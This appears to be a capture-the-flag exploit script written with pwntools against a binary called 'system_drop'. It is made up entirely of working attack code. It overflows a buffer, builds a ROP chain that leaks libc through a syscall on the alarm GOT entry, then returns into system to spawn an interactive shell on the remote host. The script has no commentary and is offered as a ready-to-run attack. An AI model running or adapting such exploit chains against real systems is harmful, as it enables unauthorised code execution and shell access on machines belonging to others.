from pwn import *

#r = process(['./system_drop'])
r = remote(...)
elf = ELF("./system_drop")

W_BASE = 0x601000
POP_RSI_R15_RET = 0x00000000004005d1
POP_RDI = 0x00000000004005d3
SYSCALL = 0x40053b

payload = b"a" * 0x28 + p64(POP_RDI) + p64(1)
payload += p64(POP_RSI_R15_RET) + p64(elf.got['alarm']) + p64(0)
payload += p64(SYSCALL) + p64(0x00400541)

r.sendline(payload)
leak = u64(r.recv(8))
leak -= 0x0e4610
log.info("Libc @ 0x%x" % leak)
r.sendline(b"a" * 0x28 + p64(POP_RDI) + p64(leak+0x1b3e1a) + p64(leak+0x04f550))
r.interactive()
